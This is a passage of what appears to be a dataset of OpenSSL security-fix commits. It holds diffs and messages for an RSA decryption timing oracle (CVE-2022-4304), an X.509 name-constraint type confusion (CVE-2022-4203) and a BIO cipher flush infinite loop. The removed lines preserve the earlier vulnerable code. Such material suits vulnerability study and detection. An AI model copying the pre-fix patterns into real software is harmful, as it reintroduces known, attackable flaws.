    +    OPENSSL_free(l_mul);

    +    OPENSSL_free(l_mod);

    +    OPENSSL_free(l_tmp);

    +    OPENSSL_free(l_ret);

    +

    +    return ret;

    +}'
  - "--- a/crypto/rsa/rsa_ossl.c\n+++ b/crypto/rsa/rsa_ossl.c\n@@ -369,19 +369,100\
    \ @@ static int rsa_ossl_private_encrypt(int flen, const unsigned char *from,\n\
    \     return r;\n }\n \n+static int derive_kdk(int flen, const unsigned char *from,\
    \ RSA *rsa,\n+                      unsigned char *buf, int num, unsigned char\
    \ *kdk)\n+{\n+    int ret = 0;\n+    HMAC_CTX *hmac = NULL;\n+    EVP_MD *md =\
    \ NULL;\n+    unsigned int md_len = SHA256_DIGEST_LENGTH;\n+    unsigned char\
    \ d_hash[SHA256_DIGEST_LENGTH] = {0};\n+    /*\n+     * because we use d as a\
    \ handle to rsa->d we need to keep it local and\n+     * free before any further\
    \ use of rsa->d\n+     */\n+    BIGNUM *d = BN_new();\n+\n+    if (d == NULL)\
    \ {\n+        ERR_raise(ERR_LIB_RSA, ERR_R_CRYPTO_LIB);\n+        goto err;\n\
    +    }\n+    if (rsa->d == NULL) {\n+        ERR_raise(ERR_LIB_RSA, RSA_R_MISSING_PRIVATE_KEY);\n\
    +        BN_free(d);\n+        goto err;\n+    }\n+    BN_with_flags(d, rsa->d,\
    \ BN_FLG_CONSTTIME);\n+    if (BN_bn2binpad(d, buf, num) < 0) {\n+        ERR_raise(ERR_LIB_RSA,\
    \ ERR_R_INTERNAL_ERROR);\n+        BN_free(d);\n+        goto err;\n+    }\n+\
    \    BN_free(d);\n+\n+    /*\n+     * we use hardcoded hash so that migrating\
    \ between versions that use\n+     * different hash doesn't provide a Bleichenbacher\
    \ oracle:\n+     * if the attacker can see that different versions return different\n\
    +     * messages for the same ciphertext, they'll know that the message is\n+\
    \     * syntethically generated, which means that the padding check failed\n+\
    \     */\n+    md = EVP_MD_fetch(rsa->libctx, \"sha256\", NULL);\n+    if (md\
    \ == NULL) {\n+        ERR_raise(ERR_LIB_RSA, ERR_R_FETCH_FAILED);\n+        goto\
    \ err;\n+    }\n+\n+    if (EVP_Digest(buf, num, d_hash, NULL, md, NULL) <= 0)\
    \ {\n+        ERR_raise(ERR_LIB_RSA, ERR_R_INTERNAL_ERROR);\n+        goto err;\n\
    +    }\n+\n+    hmac = HMAC_CTX_new();\n+    if (hmac == NULL) {\n+        ERR_raise(ERR_LIB_RSA,\
    \ ERR_R_CRYPTO_LIB);\n+        goto err;\n+    }\n+\n+    if (HMAC_Init_ex(hmac,\
    \ d_hash, sizeof(d_hash), md, NULL) <= 0) {\n+        ERR_raise(ERR_LIB_RSA, ERR_R_INTERNAL_ERROR);\n\
    +        goto err;\n+    }\n+\n+    if (flen < num) {\n+        memset(buf, 0,\
    \ num - flen);\n+        if (HMAC_Update(hmac, buf, num - flen) <= 0) {\n+   \
    \         ERR_raise(ERR_LIB_RSA, ERR_R_INTERNAL_ERROR);\n+            goto err;\n\
    +        }\n+    }\n+    if (HMAC_Update(hmac, from, flen) <= 0) {\n+        ERR_raise(ERR_LIB_RSA,\
    \ ERR_R_INTERNAL_ERROR);\n+        goto err;\n+    }\n+\n+    md_len = SHA256_DIGEST_LENGTH;\n\
    +    if (HMAC_Final(hmac, kdk, &md_len) <= 0) {\n+        ERR_raise(ERR_LIB_RSA,\
    \ ERR_R_INTERNAL_ERROR);\n+        goto err;\n+    }\n+    ret = 1;\n+\n+ err:\n\
    +    HMAC_CTX_free(hmac);\n+    EVP_MD_free(md);\n+    return ret;\n+}\n+\n static\
    \ int rsa_ossl_private_decrypt(int flen, const unsigned char *from,\n        \
    \                            unsigned char *to, RSA *rsa, int padding)\n {\n \
    \    BIGNUM *f, *ret;\n     int j, num = 0, r = -1;\n     unsigned char *buf =\
    \ NULL;\n-    unsigned char d_hash[SHA256_DIGEST_LENGTH] = {0};\n-    HMAC_CTX\
    \ *hmac = NULL;\n-    unsigned int md_len = SHA256_DIGEST_LENGTH;\n     unsigned\
    \ char kdk[SHA256_DIGEST_LENGTH] = {0};\n     BN_CTX *ctx = NULL;\n     int local_blinding\
    \ = 0;\n-    EVP_MD *md = NULL;\n     /*\n      * Used only if the blinding structure\
    \ is shared. A non-NULL unblind\n      * instructs rsa_blinding_convert() and\
    \ rsa_blinding_invert() to store\n@@ -486,89 +567,30 @@ static int rsa_ossl_private_decrypt(int\
    \ flen, const unsigned char *from,\n         BN_free(d);\n     }\n \n-    if (blinding)\n\
    -        if (!rsa_blinding_invert(blinding, ret, unblind, ctx))\n-           \
    \ goto err;\n-\n     /*\n      * derive the Key Derivation Key from private exponent\
    \ and public\n      * ciphertext\n      */\n     if (padding == RSA_PKCS1_PADDING)\
    \ {\n-        /*\n-         * because we use d as a handle to rsa->d we need to\
    \ keep it local and\n-         * free before any further use of rsa->d\n-    \
    \     */\n-        BIGNUM *d = BN_new();\n-        if (d == NULL) {\n-       \
    \     ERR_raise(ERR_LIB_RSA, ERR_R_MALLOC_FAILURE);\n+        if (derive_kdk(flen,\
    \ from, rsa, buf, num, kdk) == 0)\n             goto err;\n-        }\n-     \
    \   if (rsa->d == NULL) {\n-            ERR_raise(ERR_LIB_RSA, RSA_R_MISSING_PRIVATE_KEY);\n\
    -            BN_free(d);\n-            goto err;\n-        }\n-        BN_with_flags(d,\
    \ rsa->d, BN_FLG_CONSTTIME);\n-        if (BN_bn2binpad(d, buf, num) < 0) {\n\
    -            ERR_raise(ERR_LIB_RSA, ERR_R_INTERNAL_ERROR);\n-            BN_free(d);\n\
    -            goto err;\n-        }\n-        BN_free(d);\n+    }\n \n+    if (blinding)\
    \ {\n         /*\n-         * we use hardcoded hash so that migrating between\
    \ versions that use\n-         * different hash doesn't provide a Bleichenbacher\
    \ oracle:\n-         * if the attacker can see that different versions return\
    \ different\n-         * messages for the same ciphertext, they'll know that the\
    \ message is\n-         * syntethically generated, which means that the padding\
    \ check failed\n+         * ossl_bn_rsa_do_unblind() combines blinding inversion\
    \ and\n+         * 0-padded BN BE serialization\n          */\n-        md = EVP_MD_fetch(rsa->libctx,\
    \ \"sha256\", NULL);\n-        if (md == NULL) {\n-            ERR_raise(ERR_LIB_RSA,\
    \ ERR_R_INTERNAL_ERROR);\n-            goto err;\n-        }\n-\n-        if (EVP_Digest(buf,\
    \ num, d_hash, NULL, md, NULL) <= 0) {\n-            ERR_raise(ERR_LIB_RSA, ERR_R_INTERNAL_ERROR);\n\
    +        j = ossl_bn_rsa_do_unblind(ret, blinding, unblind, rsa->n, ctx,\n+  \
    \                                 buf, num);\n+        if (j == 0)\n         \
    \    goto err;\n-        }\n-\n-        hmac = HMAC_CTX_new();\n-        if (hmac\
    \ == NULL) {\n-            ERR_raise(ERR_LIB_RSA, ERR_R_MALLOC_FAILURE);\n-  \
    \          goto err;\n-        }\n-\n-        if (HMAC_Init_ex(hmac, d_hash, sizeof(d_hash),\
    \ md, NULL) <= 0) {\n-            ERR_raise(ERR_LIB_RSA, ERR_R_INTERNAL_ERROR);\n\
    -            goto err;\n-        }\n-\n-        if (flen < num) {\n-         \
    \   memset(buf, 0, num - flen);\n-            if (HMAC_Update(hmac, buf, num -\
    \ flen) <= 0) {\n-                ERR_raise(ERR_LIB_RSA, ERR_R_INTERNAL_ERROR);\n\
    -                goto err;\n-            }\n-        }\n-        if (HMAC_Update(hmac,\
    \ from, flen) <= 0) {\n-            ERR_raise(ERR_LIB_RSA, ERR_R_INTERNAL_ERROR);\n\
    -            goto err;\n-        }\n-\n-        md_len = SHA256_DIGEST_LENGTH;\n\
    -        if (HMAC_Final(hmac, kdk, &md_len) <= 0) {\n-            ERR_raise(ERR_LIB_RSA,\
    \ ERR_R_INTERNAL_ERROR);\n+    } else {\n+        j = BN_bn2binpad(ret, buf, num);\n\
    +        if (j < 0)\n             goto err;\n-        }\n     }\n \n-    j = BN_bn2binpad(ret,\
    \ buf, num);\n-    if (j < 0)\n-        goto err;\n-\n     switch (padding) {\n\
    \     case RSA_PKCS1_NO_IMPLICIT_REJECT_PADDING:\n         r = RSA_padding_check_PKCS1_type_2(to,\
    \ num, buf, j, num);\n@@ -597,8 +619,6 @@ static int rsa_ossl_private_decrypt(int\
    \ flen, const unsigned char *from,\n #endif\n \n  err:\n-    HMAC_CTX_free(hmac);\n\
    -    EVP_MD_free(md);\n     BN_CTX_end(ctx);\n     BN_CTX_free(ctx);\n     OPENSSL_clear_free(buf,\
    \ num);"
  commit_message: 'Fix Timing Oracle in RSA decryption


    A timing based side channel exists in the OpenSSL RSA Decryption

    implementation which could be sufficient to recover a plaintext across

    a network in a Bleichenbacher style attack. To achieve a successful

    decryption an attacker would have to be able to send a very large number

    of trial messages for decryption. The vulnerability affects all RSA

    padding modes: PKCS#1 v1.5, RSA-OEAP and RSASVE.


    Patch written by Dmitry Belyavsky and Hubert Kario


    CVE-2022-4304


    Reviewed-by: Matt Caswell <matt@openssl.org>

    Reviewed-by: Tomas Mraz <tomas@openssl.org>'
  commit_sha: b1892d21f8f0435deb0250f24a97915dc641c807
  repo_name: openssl/openssl
- commit_diff:
  - "--- a/crypto/x509/v3_ncons.c\n+++ b/crypto/x509/v3_ncons.c\n@@ -34,7 +34,8 @@\
    \ static int do_i2r_name_constraints(const X509V3_EXT_METHOD *method,\n static\
    \ int print_nc_ipadd(BIO *bp, ASN1_OCTET_STRING *ip);\n \n static int nc_match(GENERAL_NAME\
    \ *gen, NAME_CONSTRAINTS *nc);\n-static int nc_match_single(GENERAL_NAME *sub,\
    \ GENERAL_NAME *gen);\n+static int nc_match_single(int effective_type, GENERAL_NAME\
    \ *sub,\n+                           GENERAL_NAME *gen);\n static int nc_dn(const\
    \ X509_NAME *sub, const X509_NAME *nm);\n static int nc_dns(ASN1_IA5STRING *sub,\
    \ ASN1_IA5STRING *dns);\n static int nc_email(ASN1_IA5STRING *sub, ASN1_IA5STRING\
    \ *eml);\n@@ -481,14 +482,17 @@ static int nc_match(GENERAL_NAME *gen, NAME_CONSTRAINTS\
    \ *nc)\n {\n     GENERAL_SUBTREE *sub;\n     int i, r, match = 0;\n+    int effective_type\
    \ = gen->type;\n+\n     /*\n      * We need to compare not gen->type field but\
    \ an \"effective\" type because\n      * the otherName field may contain EAI email\
    \ address treated specially\n      * according to RFC 8398, section 6\n      */\n\
    -    int effective_type = ((gen->type == GEN_OTHERNAME) &&\n-                \
    \          (OBJ_obj2nid(gen->d.otherName->type_id) ==\n-                     \
    \      NID_id_on_SmtpUTF8Mailbox)) ? GEN_EMAIL : gen->type;\n+    if (effective_type\
    \ == GEN_OTHERNAME &&\n+        (OBJ_obj2nid(gen->d.otherName->type_id) == NID_id_on_SmtpUTF8Mailbox))\
    \ {\n+        effective_type = GEN_EMAIL;\n+    }\n \n     /*\n      * Permitted\
    \ subtrees: if any subtrees exist of matching the type at\n@@ -497,7 +501,10 @@\
    \ static int nc_match(GENERAL_NAME *gen, NAME_CONSTRAINTS *nc)\n \n     for (i\
    \ = 0; i < sk_GENERAL_SUBTREE_num(nc->permittedSubtrees); i++) {\n         sub\
    \ = sk_GENERAL_SUBTREE_value(nc->permittedSubtrees, i);\n-        if (effective_type\
    \ != sub->base->type)\n+        if (effective_type != sub->base->type\n+     \
    \       || (effective_type == GEN_OTHERNAME &&\n+                OBJ_cmp(gen->d.otherName->type_id,\n\
    +                        sub->base->d.otherName->type_id) != 0))\n           \
    \  continue;\n         if (!nc_minmax_valid(sub))\n             return X509_V_ERR_SUBTREE_MINMAX;\n\
    @@ -506,7 +513,7 @@ static int nc_match(GENERAL_NAME *gen, NAME_CONSTRAINTS *nc)\n\
    \             continue;\n         if (match == 0)\n             match = 1;\n-\
    \        r = nc_match_single(gen, sub->base);\n+        r = nc_match_single(effective_type,\
    \ gen, sub->base);\n         if (r == X509_V_OK)\n             match = 2;\n  \
    \       else if (r != X509_V_ERR_PERMITTED_VIOLATION)\n@@ -520,12 +527,15 @@ static\
    \ int nc_match(GENERAL_NAME *gen, NAME_CONSTRAINTS *nc)\n \n     for (i = 0; i\
    \ < sk_GENERAL_SUBTREE_num(nc->excludedSubtrees); i++) {\n         sub = sk_GENERAL_SUBTREE_value(nc->excludedSubtrees,\
    \ i);\n-        if (effective_type != sub->base->type)\n+        if (effective_type\
    \ != sub->base->type\n+            || (effective_type == GEN_OTHERNAME &&\n+ \
    \               OBJ_cmp(gen->d.otherName->type_id,\n+                        sub->base->d.otherName->type_id)\
    \ != 0))\n             continue;\n         if (!nc_minmax_valid(sub))\n      \
    \       return X509_V_ERR_SUBTREE_MINMAX;\n \n-        r = nc_match_single(gen,\
    \ sub->base);\n+        r = nc_match_single(effective_type, gen, sub->base);\n\
    \         if (r == X509_V_OK)\n             return X509_V_ERR_EXCLUDED_VIOLATION;\n\
    \         else if (r != X509_V_ERR_PERMITTED_VIOLATION)\n@@ -537,15 +547,22 @@\
    \ static int nc_match(GENERAL_NAME *gen, NAME_CONSTRAINTS *nc)\n \n }\n \n-static\
    \ int nc_match_single(GENERAL_NAME *gen, GENERAL_NAME *base)\n+static int nc_match_single(int\
    \ effective_type, GENERAL_NAME *gen,\n+                           GENERAL_NAME\
    \ *base)\n {\n     switch (gen->type) {\n     case GEN_OTHERNAME:\n-        /*\n\
    -         * We are here only when we have SmtpUTF8 name,\n-         * so we match\
    \ the value of othername with base->d.rfc822Name\n-         */\n-        return\
    \ nc_email_eai(gen->d.otherName->value, base->d.rfc822Name);\n+        switch\
    \ (effective_type) {\n+        case GEN_EMAIL:\n+            /*\n+           \
    \  * We are here only when we have SmtpUTF8 name,\n+             * so we match\
    \ the value of othername with base->d.rfc822Name\n+             */\n+        \
    \    return nc_email_eai(gen->d.otherName->value, base->d.rfc822Name);\n+\n+ \
    \       default:\n+            return X509_V_ERR_UNSUPPORTED_CONSTRAINT_TYPE;\n\
    +        }\n \n     case GEN_DIRNAME:\n         return nc_dn(gen->d.directoryName,\
    \ base->d.directoryName);"
  commit_message: 'Fix type confusion in nc_match_single()


    This function assumes that if the "gen" is an OtherName, then the "base"

    is a rfc822Name constraint. This assumption is not true in all cases.

    If the end-entity certificate contains an OtherName SAN of any type besides

    SmtpUtf8Mailbox and the CA certificate contains a name constraint of

    OtherName (of any type), then "nc_email_eai" will be invoked, with the

    OTHERNAME "base" being incorrectly interpreted as a ASN1_IA5STRING.


    Reported by Corey Bonnell from Digicert.


    CVE-2022-4203


    Reviewed-by: Paul Dale <pauli@openssl.org>

    Reviewed-by: Richard Levitte <levitte@openssl.org>

    Reviewed-by: Tomas Mraz <tomas@openssl.org>'
  commit_sha: 748f478f814bc8e418542c68599ec7dbcbac97b2
  repo_name: openssl/openssl
- commit_diff:
  - "--- a/crypto/evp/bio_enc.c\n+++ b/crypto/evp/bio_enc.c\n@@ -297,6 +297,7 @@ static\
    \ long enc_ctrl(BIO *b, int cmd, long num, void *ptr)\n     int i;\n     EVP_CIPHER_CTX\
    \ **c_ctx;\n     BIO *next;\n+    int pend;\n \n     ctx = BIO_get_data(b);\n\
    \     next = BIO_next(b);\n@@ -332,8 +333,14 @@ static long enc_ctrl(BIO *b, int\
    \ cmd, long num, void *ptr)\n         /* do a final write */\n  again:\n     \
    \    while (ctx->buf_len != ctx->buf_off) {\n+            pend = ctx->buf_len\
    \ - ctx->buf_off;\n             i = enc_write(b, NULL, 0);\n-            if (i\
    \ < 0)\n+            /*\n+             * i should never be > 0 here because we\
    \ didn't ask to write any\n+             * new data. We stop if we get an error\
    \ or we failed to make any\n+             * progress writing pending data.\n+\
    \             */\n+            if (i < 0 || (ctx->buf_len - ctx->buf_off) == pend)\n\
    \                 return i;\n         }\n "
  commit_message: 'Fix BIO_f_cipher() flushing


    If an error occurs during a flush on a BIO_f_cipher() then in some cases

    we could get into an infinite loop. We add a check to make sure we are

    making progress during flush and exit if not.


    This issue was reported by Octavio Galland who also demonstrated an

    infinite loop in CMS encryption as a result of this bug.


    The security team has assessed this issue as not a CVE. This occurs on

    *encryption* only which is typically processing trusted data. We are not

    aware of a way to trigger this with untrusted data.


    Reviewed-by: Hugo Landau <hlandau@openssl.org>

    Reviewed-by: Tomas Mraz <tomas@openssl.org>

    (Merged from https://github.com/openssl/openssl/pull/19918)'
  commit_sha: e51dd6ee1bac6b54debea3f48c6f58b761229b73
  repo_name: openssl/openssl
- commit_diff:
  - "--- a/crypto/rsa/rsa_ossl.c\n+++ b/crypto/rsa/rsa_ossl.c\n@@ -17,6 +17,9 @@\n\
    \ #include \"crypto/bn.h\"\n #include \"rsa_local.h\"\n #include \"internal/constant_time.h\"\
    \n+#include <openssl/evp.h>\n+#include <openssl/sha.h>\n+#include <openssl/hmac.h>\n\
    \ \n static int rsa_ossl_public_encrypt(int flen, const unsigned char *from,\n\
    \                                   unsigned char *to, RSA *rsa, int padding);\n\
    @@ -372,8 +375,13 @@ static int rsa_ossl_private_decrypt(int flen, const unsigned\
    \ char *from,\n     BIGNUM *f, *ret;\n     int j, num = 0, r = -1;\n     unsigned\
    \ char *buf = NULL;\n+    unsigned char d_hash[SHA256_DIGEST_LENGTH] = {0};\n\
    +    HMAC_CTX *hmac = NULL;\n+    unsigned int md_len = SHA256_DIGEST_LENGTH;\n\
    +    unsigned char kdk[SHA256_DIGEST_LENGTH] = {0};\n     BN_CTX *ctx = NULL;\n\
    \     int local_blinding = 0;\n+    EVP_MD *md = NULL;\n     /*\n      * Used\
    \ only if the blinding structure is shared. A non-NULL unblind\n      * instructs\
    \ rsa_blinding_convert() and rsa_blinding_invert() to store\n@@ -405,6 +413,11\
    \ @@ static int rsa_ossl_private_decrypt(int flen, const unsigned char *from,\n\
    \         goto err;\n     }\n \n+    if (flen < 1) {\n+        ERR_raise(ERR_LIB_RSA,\
    \ RSA_R_DATA_TOO_SMALL);\n+        goto err;\n+    }\n+\n     /* make data into\
    \ a big number */\n     if (BN_bin2bn(from, (int)flen, f) == NULL)\n         goto\
    \ err;\n@@ -471,13 +484,91 @@ static int rsa_ossl_private_decrypt(int flen, const\
    \ unsigned char *from,\n         if (!rsa_blinding_invert(blinding, ret, unblind,\
    \ ctx))\n             goto err;\n \n+    /*\n+     * derive the Key Derivation\
    \ Key from private exponent and public\n+     * ciphertext\n+     */\n+    if\
    \ (!(rsa->flags & RSA_FLAG_EXT_PKEY)) {\n+        /*\n+         * because we use\
    \ d as a handle to rsa->d we need to keep it local and\n+         * free before\
    \ any further use of rsa->d\n+         */\n+        BIGNUM *d = BN_new();\n+ \
    \       if (d == NULL) {\n+            ERR_raise(ERR_LIB_RSA, ERR_R_MALLOC_FAILURE);\n\
    +            goto err;\n+        }\n+        if (rsa->d == NULL) {\n+        \
    \    ERR_raise(ERR_LIB_RSA, RSA_R_MISSING_PRIVATE_KEY);\n+            BN_free(d);\n\
    +            goto err;\n+        }\n+        BN_with_flags(d, rsa->d, BN_FLG_CONSTTIME);\n\
    +        if (BN_bn2binpad(d, buf, num) < 0) {\n+            ERR_raise(ERR_LIB_RSA,\
    \ ERR_R_INTERNAL_ERROR);\n+            BN_free(d);\n+            goto err;\n+\
    \        }\n+        BN_free(d);\n+\n+        /*\n+         * we use hardcoded\
    \ hash so that migrating between versions that use\n+         * different hash\
    \ doesn't provide a Bleichenbacher oracle:\n+         * if the attacker can see\
    \ that different versions return different\n+         * messages for the same\
    \ ciphertext, they'll know that the message is\n+         * syntethically generated,\
    \ which means that the padding check failed\n+         */\n+        md = EVP_MD_fetch(rsa->libctx,\
    \ \"sha256\", NULL);\n+        if (md == NULL) {\n+            ERR_raise(ERR_LIB_RSA,\
    \ ERR_R_INTERNAL_ERROR);\n+            goto err;\n+        }\n+\n+        if (EVP_Digest(buf,\
    \ num, d_hash, NULL, md, NULL) <= 0) {\n+            ERR_raise(ERR_LIB_RSA, ERR_R_INTERNAL_ERROR);\n\
    +            goto err;\n+        }\n+\n+        hmac = HMAC_CTX_new();\n+    \
    \    if (hmac == NULL) {\n+            ERR_raise(ERR_LIB_RSA, ERR_R_MALLOC_FAILURE);\n\
    +            goto err;\n+        }\n+\n+        if (HMAC_Init_ex(hmac, d_hash,\
    \ sizeof(d_hash), md, NULL) <= 0) {\n+            ERR_raise(ERR_LIB_RSA, ERR_R_INTERNAL_ERROR);\n\
    +            goto err;\n+        }\n+\n+        if (flen < num) {\n+         \
    \   memset(buf, 0, num - flen);\n+            if (HMAC_Update(hmac, buf, num -\
    \ flen) <= 0) {\n+                ERR_raise(ERR_LIB_RSA, ERR_R_INTERNAL_ERROR);\n\
    +                goto err;\n+            }\n+        }\n+        if (HMAC_Update(hmac,\
    \ from, flen) <= 0) {\n+            ERR_raise(ERR_LIB_RSA, ERR_R_INTERNAL_ERROR);\n\
    +            goto err;\n+        }\n+\n+        md_len = SHA256_DIGEST_LENGTH;\n\
    +        if (HMAC_Final(hmac, kdk, &md_len) <= 0) {\n+            ERR_raise(ERR_LIB_RSA,\
    \ ERR_R_INTERNAL_ERROR);\n+            goto err;\n+        }\n+    }\n+\n    \
    \ j = BN_bn2binpad(ret, buf, num);\n     if (j < 0)\n         goto err;\n \n \
    \    switch (padding) {\n     case RSA_PKCS1_PADDING:\n-        r = RSA_padding_check_PKCS1_type_2(to,\
    \ num, buf, j, num);\n+        if (rsa->flags & RSA_FLAG_EXT_PKEY)\n+        \
    \    r = RSA_padding_check_PKCS1_type_2(to, num, buf, j, num);\n+        else\n\
    +            r = ossl_rsa_padding_check_PKCS1_type_2(rsa->libctx, to, num, buf,\
    \ j, num, kdk);\n         break;\n     case RSA_PKCS1_OAEP_PADDING:\n        \
    \ r = RSA_padding_check_PKCS1_OAEP(to, num, buf, j, num, NULL, 0);\n@@ -500,6\
    \ +591,8 @@ static int rsa_ossl_private_decrypt(int flen, const unsigned char\
    \ *from,\n #endif\n \n  err:\n+    HMAC_CTX_free(hmac);\n+    EVP_MD_free(md);\n\
    \     BN_CTX_end(ctx);\n     BN_CTX_free(ctx);\n     OPENSSL_clear_free(buf, num);"
  - "--- a/crypto/rsa/rsa_pk1.c\n+++ b/crypto/rsa/rsa_pk1.c\n@@ -21,10 +21,14 @@\n\
    \ #include <openssl/rand.h>\n /* Just for the SSL_MAX_MASTER_KEY_LENGTH value\
    \ */\n #include <openssl/prov_ssl.h>\n+#include <openssl/evp.h>\n+#include <openssl/sha.h>\n\
    +#include <openssl/hmac.h>\n #include \"internal/cryptlib.h\"\n #include \"crypto/rsa.h\"\
    \n #include \"rsa_local.h\"\n \n+\n int RSA_padding_add_PKCS1_type_1(unsigned\
    \ char *to, int tlen,\n                                  const unsigned char *from,\
    \ int flen)\n {\n@@ -271,6 +275,254 @@ int RSA_padding_check_PKCS1_type_2(unsigned\
    \ char *to, int tlen,\n     return constant_time_select_int(good, mlen, -1);\n\
    \ }\n \n+\n+static int ossl_rsa_prf(OSSL_LIB_CTX *ctx,\n+                    \
    \    unsigned char *to, int tlen,\n+                        const char *label,\
    \ int llen,\n+                        const unsigned char *kdk,\n+           \
    \             uint16_t bitlen)\n+{\n+    int pos;\n+    int ret = -1;\n+    uint16_t\
    \ iter = 0;\n+    unsigned char be_iter[sizeof(iter)];\n+    unsigned char be_bitlen[sizeof(bitlen)];\n\
    +    HMAC_CTX *hmac = NULL;\n+    EVP_MD *md = NULL;\n+    unsigned char hmac_out[SHA256_DIGEST_LENGTH];\n\
    +    unsigned int md_len;\n+\n+    if (tlen * 8 != bitlen) {\n+        ERR_raise(ERR_LIB_RSA,\
    \ ERR_R_INTERNAL_ERROR);\n+        return ret;\n+    }\n+\n+    be_bitlen[0] =\
    \ (bitlen >> 8) & 0xff;\n+    be_bitlen[1] = bitlen & 0xff;\n+\n+    hmac = HMAC_CTX_new();\n\
    +    if (hmac == NULL) {\n+        ERR_raise(ERR_LIB_RSA, ERR_R_INTERNAL_ERROR);\n\
    +        goto err;\n+    }\n+\n+    /*\n+     * we use hardcoded hash so that\
    \ migrating between versions that use\n+     * different hash doesn't provide\
    \ a Bleichenbacher oracle:\n+     * if the attacker can see that different versions\
    \ return different\n+     * messages for the same ciphertext, they'll know that\
    \ the message is\n+     * syntethically generated, which means that the padding\
    \ check failed\n+     */\n+    md = EVP_MD_fetch(ctx, \"sha256\", NULL);\n+  \
    \  if (md == NULL) {\n+        ERR_raise(ERR_LIB_RSA, ERR_R_INTERNAL_ERROR);\n\
    +        goto err;\n+    }\n+\n+    if (HMAC_Init_ex(hmac, kdk, SHA256_DIGEST_LENGTH,\
    \ md, NULL) <= 0) {\n+        ERR_raise(ERR_LIB_RSA, ERR_R_INTERNAL_ERROR);\n\
    +        goto err;\n+    }\n+\n+    for (pos = 0; pos < tlen; pos += SHA256_DIGEST_LENGTH,\
    \ iter++) {\n+        if (HMAC_Init_ex(hmac, NULL, 0, NULL, NULL) <= 0) {\n+ \
    \           ERR_raise(ERR_LIB_RSA, ERR_R_INTERNAL_ERROR);\n+            goto err;\n\
    +        }\n+\n+        be_iter[0] = (iter >> 8) & 0xff;\n+        be_iter[1]\
    \ = iter & 0xff;\n+\n+        if (HMAC_Update(hmac, be_iter, sizeof(be_iter))\
    \ <= 0) {\n+            ERR_raise(ERR_LIB_RSA, ERR_R_INTERNAL_ERROR);\n+     \
    \       goto err;\n+        }\n+        if (HMAC_Update(hmac, (unsigned char *)label,\
    \ llen) <= 0) {\n+            ERR_raise(ERR_LIB_RSA, ERR_R_INTERNAL_ERROR);\n\
    +            goto err;\n+        }\n+        if (HMAC_Update(hmac, be_bitlen,\
    \ sizeof(be_bitlen)) <= 0) {\n+            ERR_raise(ERR_LIB_RSA, ERR_R_INTERNAL_ERROR);\n\
    +            goto err;\n+        }\n+\n+        /*\n+         * HMAC_Final requires\
    \ the output buffer to fit the whole MAC\n+         * value, so we need to use\
    \ the intermediate buffer for the last\n+         * unaligned block\n+       \
    \  */\n+        md_len = SHA256_DIGEST_LENGTH;\n+        if (pos + SHA256_DIGEST_LENGTH\
    \ > tlen) {\n+            if (HMAC_Final(hmac, hmac_out, &md_len) <= 0) {\n+ \
    \               ERR_raise(ERR_LIB_RSA, ERR_R_INTERNAL_ERROR);\n+             \
    \   goto err;\n+            }\n+            memcpy(to + pos, hmac_out, tlen -\
    \ pos);\n+        } else {\n+            if (HMAC_Final(hmac, to + pos, &md_len)\
    \ <= 0) {\n+                ERR_raise(ERR_LIB_RSA, ERR_R_INTERNAL_ERROR);\n+ \
    \               goto err;\n+            }\n+        }\n+    }\n+\n+    ret = 0;\n\
    +\n+err:\n+    HMAC_CTX_free(hmac);\n+    EVP_MD_free(md);\n+    return ret;\n\
    +}\n+\n+/*\n+ * ossl_rsa_padding_check_PKCS1_type_2() checks and removes the PKCS#1\
    \ type 2\n+ * padding from a decrypted RSA message. Unlike the\n+ * RSA_padding_check_PKCS1_type_2()\
    \ it will not return an error in case it\n+ * detects a padding error, rather\
    \ it will return a deterministically generated\n+ * random message. In other words\
    \ it will perform an implicit rejection\n+ * of an invalid padding. This means\
    \ that the returned value does not indicate\n+ * if the padding of the encrypted\
    \ message was correct or not, making\n+ * side channel attacks like the ones described\
    \ by Bleichenbacher impossible\n+ * without access to the full decrypted value\
    \ and a brute-force search of\n+ * remaining padding bytes\n+ */\n+int ossl_rsa_padding_check_PKCS1_type_2(OSSL_LIB_CTX\
    \ *ctx,\n+                                        unsigned char *to, int tlen,\n\
    +                                        const unsigned char *from, int flen,\n\
    +                                        int num, unsigned char *kdk)\n+{\n+/*\n\
    + * We need to generate a random length for the synthethic message, to avoid\n\
    + * bias towards zero and avoid non-constant timeness of DIV, we prepare\n+ *\
    \ 128 values to check if they are not too large for the used key size,\n+ * and\
    \ use 0 in case none of them are small enough, as 2^-128 is a good enough\n+ *\
    \ safety margin\n+ */\n+#define MAX_LEN_GEN_TRIES 128\n+    unsigned char *synthetic\
    \ = NULL;\n+    int synthethic_length;\n+    uint16_t len_candidate;\n+    unsigned\
    \ char candidate_lengths[MAX_LEN_GEN_TRIES * sizeof(len_candidate)];\n+    uint16_t\
    \ len_mask;\n+    uint16_t max_sep_offset;\n+    int synth_msg_index = 0;\n+ \
    \   int ret = -1;\n+    int i, j;\n+    unsigned int good, found_zero_byte;\n\
    +    int zero_index = 0, msg_index;\n+\n+    /*\n+     * If these checks fail\
    \ then either the message in publicly invalid, or\n+     * we've been called incorrectly.\
    \ We can fail immediately.\n+     * Since this code is called only internally\
    \ by openssl, those are just\n+     * sanity checks\n+     */\n+    if (num !=\
    \ flen || tlen <= 0 || flen <= 0) {\n+        ERR_raise(ERR_LIB_RSA, ERR_R_INTERNAL_ERROR);\n\
    +        return -1;\n+    }\n+\n+    /* Generate a random message to return in\
    \ case the padding checks fail */\n+    synthetic = OPENSSL_malloc(flen);\n+ \
    \   if (synthetic == NULL) {\n+        ERR_raise(ERR_LIB_RSA, ERR_R_MALLOC_FAILURE);\n\
    +        return -1;\n+    }\n+\n+    if (ossl_rsa_prf(ctx, synthetic, flen, \"\
    message\", 7, kdk, flen * 8) < 0)\n+        goto err;\n+\n+    /* decide how long\
    \ the random message should be */\n+    if (ossl_rsa_prf(ctx, candidate_lengths,\
    \ sizeof(candidate_lengths),\n+                     \"length\", 6, kdk,\n+   \
    \                  MAX_LEN_GEN_TRIES * sizeof(len_candidate) * 8) < 0)\n+    \
    \    goto err;\n+\n+    /*\n+     * max message size is the size of the modulus\
    \ size less 2 bytes for\n+     * version and padding type and a minimum of 8 bytes\
    \ padding\n+     */\n+    len_mask = max_sep_offset = flen - 2 - 8;\n+    /*\n\
    +     * we want a mask so lets propagate the high bit to all positions less\n\
    +     * significant than it\n+     */\n+    len_mask |= len_mask >> 1;\n+    len_mask\
    \ |= len_mask >> 2;\n+    len_mask |= len_mask >> 4;\n+    len_mask |= len_mask\
    \ >> 8;\n+\n+    synthethic_length = 0;\n+    for (i = 0; i < MAX_LEN_GEN_TRIES\
